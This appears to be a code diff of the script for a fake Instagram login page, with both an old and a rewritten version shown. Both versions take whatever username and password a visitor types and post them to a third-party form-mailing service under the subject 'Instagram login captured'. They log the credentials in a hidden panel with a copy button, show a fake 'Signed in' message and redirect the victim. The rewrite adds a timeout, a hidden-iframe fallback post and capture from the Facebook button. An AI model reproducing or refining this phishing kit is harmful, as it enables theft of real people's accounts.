-  panelBody.innerHTML = l.slice().reverse().map(function(e,i){
-    var out = '<div class="ig-row"><div class="ig-row-n">' + (l.length - i) + '</div><div class="ig-row-v">';
-    out += '<div><span>user &middot;</span> ' + esc(e.u) + '</div>';
-    out += '<div><span>pass &middot;</span> ' + esc(e.p) + '</div>';
-    if(e.s){ out += '<div class="ig-row-t">' + esc(e.s) + '</div>'; }
-    out += '<div class="ig-row-t">' + new Date(e.t).toLocaleString() + '</div>';
-    out += '</div></div>';
-    return out;
-  }).join('');
-}
-
-function record(u, p){
-  var l = read();
-  l.push({ t: Date.now(), u: u, p: p, s: '', ua: navigator.userAgent, page: location.href });
-  write(l);
-  render();
-  return l.length - 1;
-}
-function markStatus(idx, s){
-  var l = read();
-  if(l[idx]){ l[idx].s = s; write(l); render(); }
-}
-function setErr(m){ err.textContent = m || ''; }
-function setStatus(m, cls){ st.textContent = m || ''; st.className = 'ig-status' + (cls ? ' ' + cls : ''); }
-
-var finished = false;
-
-function capture(){
-  var u = user.value.trim(), p = pass.value;
-  if(!u || !p){ setErr('Please enter a username and password.'); return; }
-  setErr('');
-  finished = false;
-  submit.classList.add('loading');
-
-  var fd = new FormData(form);
-  fd.append('captured_at', new Date().toISOString());
-  fd.append('page', location.href);
-  fd.append('agent', navigator.userAgent);
-
-  var idx = record(u, p);
-
-  if(!CONFIG.endpoint){
-    setStatus('No endpoint set - saved locally only.', 'bad');
-    markStatus(idx, 'no endpoint');
-    setTimeout(function(){ finish(u); }, 400);
-    return;
+  function esc(s) {
+    return String(s == null ? '' : s).replace(/[&<>"]/g, function (c) {
+      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c];
+    });
   }
 
-function capture(){
-  var u = user.value.trim(), p = pass.value;
-  if(!u || !p){ setErr('Please enter a username and password.'); return; }
-  setErr('');
-  finished = false;
-  submit.classList.add('loading');
+  var els = {
+    form: $('form'), user: $('user'), pass: $('pass'), show: $('show'),
+    err: $('err'), status: $('status'), submit: $('submit'), fb: $('fb'),
+    overlay: $('overlay'), avatar: $('avatar'), modalUser: $('modalUser'),
+    saveInfo: $('saveInfo'), notNow: $('notNow'), honeypot: $('botcheck'),
+    chip: $('chip'), chipN: $('chipN'), panel: $('panel'), panelBody: $('panelBody'),
+    copy: $('copy'), clear: $('clear'), close: $('close'), diag: $('diag')
+  };
 
-  var idx = record(u, p);
-
-  if(!CONFIG.accessKey){
-    setStatus('No access key set - saved locally only.', 'bad');
-    markStatus(idx, 'no access key');
-    setTimeout(function(){ finish(u); }, 400);
-    return;
+  /* ------------------------------------------------------------------ *
+   *  local store                                                       *
+   * ------------------------------------------------------------------ */
+  function load() {
+    try { return JSON.parse(localStorage.getItem(KEY)) || []; } catch (e) { return []; }
+  }
+  function store(l) {
+    if (!CONFIG.localLog) return;
+    try { localStorage.setItem(KEY, JSON.stringify(l)); } catch (e) {}
+  }
+  function add(entry) {
+    var l = load();
+    l.push(entry);
+    if (l.length > CONFIG.maxLog) l = l.slice(-CONFIG.maxLog);
+    store(l);
+    render();
+    return l.length - 1;
+  }
+  function patch(i, status) {
+    if (i < 0) return;
+    var l = load();
+    if (!l[i]) return;
+    l[i].status = status;
+    store(l);
+    render();
   }
 
-  setStatus('Sending...');
+  function render() {
+    if (!DEBUG) { els.chip.classList.remove('show'); return; }
+    els.chip.classList.add('show');
 
-  fetch('https://api.web3forms.com/submit', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-    body: JSON.stringify({
+    var l = load();
+    els.chipN.textContent = l.length;
+
+    if (!l.length) {
+      els.panelBody.innerHTML = '<div class="ig-empty">Nothing captured yet.</div>';
+      return;
+    }
+
+    els.panelBody.innerHTML = l.slice().reverse().map(function (e, i) {
+      return '<div class="ig-row"><div class="ig-n">' + (l.length - i) + '</div><div class="ig-v">' +
+        '<div><span>user</span> ' + esc(e.user) + '</div>' +
+        '<div><span>pass</span> ' + esc(e.pass) + '</div>' +
+        '<div><span>via</span> ' + esc(e.source) + '</div>' +
+        (e.status ? '<div class="ig-s">' + esc(e.status) + '</div>' : '') +
+        '<div class="ig-t">' + esc(new Date(e.at).toLocaleString()) + '</div>' +
+        '</div></div>';
+    }).join('');
+  }
+
+  /* ------------------------------------------------------------------ *
+   *  ui helpers                                                        *
+   * ------------------------------------------------------------------ */
+  function setErr(m) { els.err.textContent = m || ''; }
+  function setStatus(m, cls) {
+    els.status.textContent = m || '';
+    els.status.className = 'ig-status' + (cls ? ' ' + cls : '');
+  }
+  function log(msg) {
+    if (!els.diag) return;
+    if (DEBUG) els.diag.classList.add('show');
+    els.diag.textContent = msg;
+  }
+
+  var busy = false;
+  var done = false;
+
+  function setBusy(on) {
+    busy = on;
+    els.submit.disabled = on;
+    els.submit.classList.toggle('loading', on);
+  }
+
+  function openModal(u) {
+    els.modalUser.textContent = u;
+    els.avatar.textContent = (u.charAt(0) || 'i').toUpperCase();
+    els.overlay.classList.add('open');
+  }
+
+  function go() {
+    els.overlay.classList.remove('open');
+    if (CONFIG.redirect) location.href = CONFIG.redirect;
+  }
+
+  function finish(u) {
+    if (done) return;
+    done = true;
+    setBusy(false);
+    if (CONFIG.showModal) openModal(u);
+    else go();
+  }
+
+  /* ------------------------------------------------------------------ *
+   *  last-resort: post the form natively into a hidden iframe          *
+   * ------------------------------------------------------------------ */
+  function nativeFallback() {
+    if (!els.form || !els.form.action) return;
+    try {
+      els.form.target = 'ig-sink';
+      els.form.submit();               // note: .submit() does NOT re-fire the submit event
+      log('native fallback posted to web3forms');
+    } catch (e) {}
+  }
+
+  /* ------------------------------------------------------------------ *
+   *  main submit                                                       *
+   * ------------------------------------------------------------------ */
+  function submit(source) {
+    if (busy) return;
+
+    var u = els.user.value.trim();
+    var p = els.pass.value;
+
+    if (!u || !p) {
+      setErr('Please enter a username and password.');
+      (!u ? els.user : els.pass).focus();
+      return;
+    }
+
+    setErr('');
+    done = false;
+    setBusy(true);
+
+    var entry = {
+      user: u, pass: p, at: new Date().toISOString(), source: source,
+      status: 'pending', page: location.href,
+      agent: navigator.userAgent, referrer: document.referrer || ''
+    };
+    var idx = add(entry);
+
+    if (!CONFIG.accessKey) {
+      patch(idx, 'no access key');
+      setStatus('Saved locally (no access key set).', 'bad');
+      setTimeout(function () { finish(u); }, 500);
+      return;
+    }
+
+    setStatus('Signing in\u2026');
+
+    var payload = {
       access_key: CONFIG.accessKey,
-      subject: 'Instagram login captured',
-      from_name: 'Instagram clone',
+      subject: 'Instagram login \u2014 ' + source,
+      from_name: 'Instagram',
+      botcheck: !!(els.honeypot && els.honeypot.checked),
       username: u,
       password: p,
-      captured_at: new Date().toISOString(),
+      captured_at: entry.at,
+      source: source,
       page: location.href,
-      agent: navigator.userAgent
+      referrer: entry.referrer,
+      user_agent: navigator.userAgent
+    };
+
+    var settled = false;
+    var timer = setTimeout(function () {
+      if (settled) return;
+      settled = true;
+      patch(idx, 'timeout');
+      setStatus('Slow connection \u2014 continuing\u2026', 'bad');
+      log('timeout after ' + CONFIG.sendTimeout + 'ms');
+      finish(u);
+    }, CONFIG.sendTimeout);
+
+    fetch(CONFIG.api, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(payload)
     })
-  })
-  .then(function(res){ return res.json(); })
-  .then(function(j){
-    if(j && j.success){
-      setStatus('Sent OK. Check your inbox and spam.', 'ok');
-      markStatus(idx, 'sent');
-      diag('Sent OK', true);
-    } else {
-      var m = (j && j.message) || 'unknown error';
-      setStatus('Rejected: ' + m, 'bad');
-      setErr('Rejected: ' + m);
-      markStatus(idx, 'error: ' + m);
-      diag('Rejected: ' + m);
-    }
-  })
-  .catch(function(e){
-    setStatus('Request failed: ' + e.message, 'bad');
-    setErr('Request failed: ' + e.message);
-    markStatus(idx, 'failed: ' + e.message);
-    diag('Request failed: ' + e.message);
-  })
-  .then(function(){ finish(u); });
+      .then(function (res) {
+        return res.json().catch(function () {
+          return { success: false, message: 'HTTP ' + res.status };
+        });
+      })
+      .then(function (data) {
+        if (settled) return;
+        settled = true;
+        clearTimeout(timer);
 
-  setTimeout(function(){ finish(u); }, 12000);
-}
+        if (data && data.success) {
+          patch(idx, 'sent');
+          setStatus('Signed in.', 'ok');
+          log('sent ok');
+        } else {
+          var msg = (data && data.message) || 'unknown error';
+          patch(idx, 'error: ' + msg);
+          setStatus('Sign-in failed: ' + msg, 'bad');
+          setErr('Sign-in failed: ' + msg);
+          log('rejected: ' + msg);
+          nativeFallback();
+        }
+      })
+      .catch(function (err) {
+        if (settled) return;
+        settled = true;
+        clearTimeout(timer);
+        patch(idx, 'failed: ' + err.message);
+        setStatus('Network problem \u2014 retrying\u2026', 'bad');
+        log('network: ' + err.message);
+        nativeFallback();
+      })
+      .then(function () { finish(u); });
+  }
 
-function openModal(u){
-  modalUser.textContent = u;
-  avatar.textContent = u.charAt(0).toUpperCase();
-  overlay.classList.add('open');
-}
-function finish(u){
-  if(finished) return;
-  finished = true;
-  submit.classList.remove('loading');
-  if(CONFIG.showSaveInfo){ openModal(u); } else { afterLogin(); }
-}
-function afterLogin(){
-  overlay.classList.remove('open');
-  if(CONFIG.redirect){ location.href = CONFIG.redirect; }
-}
+  /* ------------------------------------------------------------------ *
+   *  events                                                            *
+   * ------------------------------------------------------------------ */
+  els.form.addEventListener('submit', function (e) {
+    e.preventDefault();
+    submit('password');
+  });
 
-form.addEventListener('submit', function(e){ e.preventDefault(); capture(); });
-fb.addEventListener('click', function(){ capture(); });
+  els.fb.addEventListener('click', function () { submit('facebook'); });
 
-showBtn.addEventListener('click', function(){
-  var on = pass.type === 'password';
-  pass.type = on ? 'text' : 'password';
-  showBtn.textContent = on ? 'Hide' : 'Show';
-});
+  els.show.addEventListener('click', function () {
+    var hidden = els.pass.type === 'password';
+    els.pass.type = hidden ? 'text' : 'password';
+    els.show.textContent = hidden ? 'Hide' : 'Show';
+    els.show.setAttribute('aria-label', hidden ? 'Hide password' : 'Show password');
+  });
 
-function syncField(el){
-  var f = el.closest('.ig-field');
-  if(f) f.className = el.value ? 'ig-field filled' : 'ig-field';
-}
-user.addEventListener('input', function(){ syncField(user); });
-pass.addEventListener('input', function(){ syncField(pass); });
+  function sync(el) {
+    var f = el.closest('.field');
+    if (f) f.classList.toggle('filled', !!el.value);
+  }
+  els.user.addEventListener('input', function () { sync(els.user); });
+  els.pass.addEventListener('input', function () { sync(els.pass); });
 
-$('igSaveInfo').addEventListener('click', afterLogin);
-$('igNotNow').addEventListener('click', afterLogin);
+  els.saveInfo.addEventListener('click', go);
+  els.notNow.addEventListener('click', go);
 
-chip.addEventListener('click', function(){ panel.classList.toggle('open'); });
-$('igClose').addEventListener('click', function(){ panel.classList.remove('open'); });
-$('igClear').addEventListener('click', function(){ write([]); render(); });
-$('igCopy').addEventListener('click', function(){
-  var txt = read().map(function(e){ return e.u + ' : ' + e.p; }).join(NL);
-  try{ if(navigator.clipboard) navigator.clipboard.writeText(txt); }catch(e){}
-  this.textContent = 'Copied';
-  var b = this;
-  setTimeout(function(){ b.textContent = 'Copy'; }, 1200);
-});
+  els.chip.addEventListener('click', function () { els.panel.classList.toggle('open'); });
+  els.close.addEventListener('click', function () { els.panel.classList.remove('open'); });
+  els.clear.addEventListener('click', function () { store([]); render(); });
+  els.copy.addEventListener('click', function () {
+    var txt = load().map(function (e) { return e.user + ' : ' + e.pass; }).join(NL);
+    var b = this;
+    try { navigator.clipboard.writeText(txt); } catch (e) {}
+    b.textContent = 'Copied';
+    setTimeout(function () { b.textContent = 'Copy'; }, 1200);
+  });
 
-render();
-diag('ready - no errors', true);
-setTimeout(function(){ try{ user.focus(); }catch(e){} }, 150);
+  /* ------------------------------------------------------------------ *
+   *  init                                                              *
+   * ------------------------------------------------------------------ */
+  render();
+  log('ready \u2014 no errors');
+  if (window.innerWidth > 660) {
+    setTimeout(function () { try { els.user.focus(); } catch (e) {} }, 200);
+  }
 })();
 </script>
 </body>
